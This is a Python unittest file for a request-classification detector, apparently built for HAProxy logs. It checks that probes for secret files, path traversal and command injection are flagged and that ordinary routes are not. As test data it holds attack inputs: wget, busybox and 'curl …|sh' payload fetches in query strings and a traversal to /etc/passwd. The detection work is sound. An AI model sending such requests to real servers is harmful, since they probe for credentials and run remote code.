"""Keep ordinary application routes distinct from probes hidden by normalisation."""
from pathlib import Path
import sys
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parent))
from test_guardd import EngineTestCase, guardd  # noqa: E402

SIGNATURES = Path(__file__).resolve().parents[1] / 'ansible/roles/haproxy-admin/files/scanner-signatures.json'


class ClassificationBoundaries(unittest.TestCase):
    def setUp(self):
        guardd.load_signatures(str(SIGNATURES))

    def test_sensitive_files_are_not_excused_by_an_asset_extension(self):
        for path in ('/uploads/.env.production.json', '/.aws/credentials.json', '/.git/config.json'):
            with self.subTest(path=path):
                self.assertTrue(guardd.category_is_decisive(guardd.classify_path(path)))

    def test_signin_names_do_not_hide_a_sensitive_file(self):
        for path in ('/api/secondfactor/.env', '/api/firstfactor-copy/.env'):
            with self.subTest(path=path):
                self.assertEqual(guardd.classify_path(path), 'secrets')

    def test_signin_prefix_has_a_route_boundary(self):
        self.assertFalse(guardd.is_authentication_endpoint('/api/firstfactor-copy'))
        self.assertTrue(guardd.is_authentication_endpoint('/api/firstfactor'))

    def test_a_generic_credentials_route_is_not_a_secret_file(self):
        for path in ('/api/credentials', '/remote.php/dav/files/operator/documents/credentials',
                     '/api/secondfactor/webauthn/credentials'):
            with self.subTest(path=path):
                self.assertEqual(guardd.classify_path(path), '')
        for path in ('/.aws/credentials', '/vendor/.aws/credentials'):
            self.assertEqual(guardd.classify_path(path), 'secrets')

    def test_ordinary_assets_stay_ordinary(self):
        for path in ('/vendor/app.js', '/wp-content/site.css', '/images/icon.svg', '/api/items.json'):
            self.assertEqual(guardd.classify_path(path), '')

    def test_searching_for_a_command_does_not_execute_one(self):
        for uri in ('/search?q=how+to+use+curl+for+API', '/search?q=installing+wget+on+linux',
                    '/e1csys?cmd=runApp&clientID=7'):
            self.assertEqual(guardd.classify_query(uri), '')
        for uri in ('/x?cmd=wget+http://example.test/payload', '/x?a=;busybox+wget',
                    '/x?cmd=curl+https://example.test/payload|sh'):
            self.assertTrue(guardd.classify_query(uri))


class ParsedPathEvidence(EngineTestCase):
    def test_traversal_is_identified_before_dot_segments_disappear(self):
        line = ('203.0.113.9:1234 [11/Aug/2026:07:00:00.000] fe_https~ be_app/srv1 '
                '0/0/0/1/1 404 100 ---- 1/1/0/0/0 0/0 '
                'GET /cgi-bin/.%2e/.%2e/etc/passwd?token=do-not-store-this HTTP/1.1')
        request = guardd.parse_access_line(line)
        self.assertEqual(request.path, '/etc/passwd')
        self.assertEqual(request.path_flag, 'path-traversal')
        self.engine.observe_request(request, 1_000_000)
        events = self.events()
        self.assertTrue(any(e['category'] == 'path-traversal' for e in events))
        self.assertNotIn('do-not-store-this', repr(events))

    def test_an_ordinary_parent_segment_does_not_prove_an_attack(self):
        for path in ('/images/../index.html', '/a/../../ordinary', '/api/items?file=../a'):
            self.assertEqual(guardd.classify_raw_path(path), '')


if __name__ == '__main__':
    unittest.main()
